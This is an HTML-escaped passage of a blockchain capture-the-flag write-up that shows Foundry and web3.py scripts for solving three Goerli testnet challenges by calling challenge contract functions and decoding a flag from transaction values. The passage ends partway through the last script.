&lt;p&gt;Initiated a foundry project quickly.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;forge init&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Created the solution script under &lt;code&gt;&#x2F;scripts&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;SolveGiveMeMoney.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;contract GiveMeMoneyScript is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setUp&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;solveGiveMeMoney&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;solveGiveMeMoney&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        address target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA2720666b2e3D878b0E7FC80bc1D02958EA648DE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;call{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.101 &lt;&#x2F;span&gt;&lt;span&gt;ether}(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;deposit(string)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ODM1.pHrlmtdBQY9UIYaE-WVDGTPOWP0&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This script will call the contract method &lt;code&gt;deposit()&lt;&#x2F;code&gt; with the string provided in the challenge as arguement. We have to send above &lt;code&gt;0.1 Eth&lt;&#x2F;code&gt; along with the call.&lt;&#x2F;p&gt;
&lt;p&gt;To run the script we need to find the network of the contract. It is &lt;code&gt;Goerli&lt;&#x2F;code&gt;, Found from etherscan. We need some test ether mined it from goerli POW faucet.&lt;&#x2F;p&gt;
&lt;p&gt;To run the script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;$&lt;&#x2F;span&gt;&lt;span&gt; forge script scripts&#x2F;SolveGiveMeMoney.s.sol&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;REDACTED&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;-private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;REDACTED&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;-broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The RPC-URL can create from alchemy, private-key is your testing wallet private key.&lt;&#x2F;p&gt;
&lt;p&gt;We wont get the flag, the challenge will be automatically solved once we run this.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;open-500pts&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#open-500pts&quot; aria-label=&quot;Anchor link for: open-500pts&quot;&gt;Open [500pts]&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;Contract : 0x35388184260d8A3cE75B5df5bbA1904b68746b27&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This challenge is also kinda same, the solve script is as follows,&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;SolveOpen.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{console} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract OpenScript is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setUp&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;solveOpen&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;solveOpen&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        address target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x35388184260d8A3cE75B5df5bbA1904b68746b27&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;bytes memory _data) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;givemetheflag(string)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ODM1.pHrlmtdBQY9UIYaE-WVDGTPOWP0&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;logBytes&lt;&#x2F;span&gt;&lt;span&gt;(_data)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run the script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;$&lt;&#x2F;span&gt;&lt;span&gt; forge script scripts&#x2F;SolveOpen.s.sol&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;REDACTED&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;-private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;REDACTED&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;-broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Flag will be automatically submitted once we run this script.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ether-footprint-500pts&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#ether-footprint-500pts&quot; aria-label=&quot;Anchor link for: ether-footprint-500pts&quot;&gt;Ether Footprint [500pts]&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Challenge provided with a contract address. And description says observe the ether dance.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Contract : 0x24D1a591b816C175eBF4cD62277ecCcdA42d1211&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;When I look the transactions to the given contract on goerli etherscan, there are 37 transactions available. I observed that the eth value in every transaction was different. I saw in the challenge tag something like &lt;code&gt;9856855-9856895&lt;&#x2F;code&gt;. These two numbers are block numbers of the starting trransaction and last block number of the transaction to this contract.&lt;&#x2F;p&gt;
&lt;p&gt;Look here to observe : &lt;a heref=&quot;https:&#x2F;&#x2F;goerli.etherscan.io&#x2F;txs?a=0x24D1a591b816C175eBF4cD62277ecCcdA42d1211&quot; target=_blank&gt;Goerli Etherscan&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, I used &lt;code&gt;web3.py&lt;&#x2F;code&gt; to list all the transaction to the target contract between these two block numbers. I fetched the value of each transaction in wei. I observed the &lt;code&gt;0,1 indexes&lt;&#x2F;code&gt; of the wei string represents the index of the character. And &lt;code&gt;4,5,6&lt;&#x2F;code&gt; indexes are the ascii values of the flag.&lt;&#x2F;p&gt;
&lt;p&gt;I wrote this &lt;code&gt;web3.py&lt;&#x2F;code&gt; script which solves challenge and prints flag for us.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Solve.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;decimal &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Decimal
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;web3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span&gt;START_BLOCK &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9856855
&lt;&#x2F;span&gt;&lt;span&gt;END_BLOCK &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9856895
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;RPC_URL &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;https:&#x2F;&#x2F;eth-goerli.g.alchemy.com&#x2F;v2&#x2F;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;  values &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;  w3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Web3&lt;&#x2F;span&gt;&lt;span&gt;(Web3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;HTTPProvider&lt;&#x2F;span&gt;&lt;span&gt;(RPC_URL))
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;_block &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(START_BLOCK&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;END_BLOCK):
&lt;&#x2F;span&gt;&lt;span&gt;    block &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;w3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;get_block&lt;&#x2F;span&gt;&lt;span&gt;(_block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;full_transactions&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;transaction &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;transactions:
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;transaction[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;to&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0x24D1a591b816C175eBF4cD62277ecCcdA42d1211&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(_block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;transaction[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;value&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;        values&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(transaction[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;value&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;  d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;values:
&lt;&#x2F;span&gt;&lt;span&gt;    string &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(i)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(string) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;15&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;      string &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;15 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(string)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;string &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;x&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# extra x to identify padded str
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(string[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;x&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;):
